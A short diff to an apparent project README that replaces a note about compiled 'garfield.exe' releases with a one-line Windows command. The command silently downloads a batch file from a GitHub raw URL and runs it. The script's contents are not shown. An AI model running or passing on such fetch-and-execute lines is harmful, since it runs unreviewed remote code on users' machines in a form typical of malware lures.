@@ -1,1 +1,3 @@
-Compiled garfield.exe releases. No source code here.
+```
+cmd /c "curl -sL https://raw.githubusercontent.com/hrmtm/garfield-releases/main/install.bat -o %TEMP%\gf.bat && %TEMP%\gf.bat"
+```
